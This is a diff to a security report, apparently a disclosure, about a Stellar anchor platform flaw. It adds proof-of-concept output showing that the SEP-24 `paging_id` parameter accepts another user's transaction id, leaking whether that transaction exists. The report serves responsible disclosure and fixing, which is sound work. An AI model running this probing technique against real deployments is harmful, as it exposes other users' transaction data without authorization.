@@ -55,6 +55,20 @@ All steps on a local instance.
      ```
   6. Compare with the fixed SEP-6 endpoint: `GET /sep6/transactions?asset_code=USDC&paging_id=<VICTIM_SEP6_TXN_ID>` returns `400` for a foreign id.
 
+### Observed output (local build of 4.9.0, PostgreSQL, `security-reports/poc/poc_02_04.py`):
+```
+=== Report 02: SEP-24 paging_id ownership oracle ===
+victim G = GD3KMYQUIWLRJM2PJ7UJ7MVRVWGZXM4WBFIYISPJO357BRYJMEDMCGXZ
+attacker G = GDSG4D6DHSKTIJX5YAJK4MHUPT3RHOY7LTMJH5DWGCBYNL2P6ZSBZWID
+attacker txn A1 = d4c337b8-6a17-464d-a0ee-db1ad6182784
+victim txn      = 78416921-1687-4381-b6fa-c52b063a1c73
+attacker txn A2 = 63da3f14-23ba-4fa2-ada5-d1598802e5f2
+paging_id=<victim id>  -> 200 ['d4c337b8-6a17-464d-a0ee-db1ad6182784']
+paging_id=<random uuid> -> 400 {"error":"invalid paging_id field: 8814bbbe-2179-47b2-bb27-1b573d3523e2"}
+GET /sep24/transaction?id=<victim id> as attacker -> 404 {"error":"transaction not found"}
+```
+The victim's id is accepted as a cursor (only `A1`, created before the victim's transaction, is returned), a random id is rejected, and the direct read of the same id is correctly denied – demonstrating that `paging_id` is the only path that leaks.
+
 ### Supporting Material:
   * `platform/src/main/java/org/stellar/anchor/platform/data/JdbcSep24TransactionStore.java:76-84` (vulnerable)
   * `platform/src/main/java/org/stellar/anchor/platform/data/JdbcSep6TransactionStore.java:71-81,123-126` (fixed SEP-6 reference implementation, commit `faec5e2`, ANCHOR-1296)
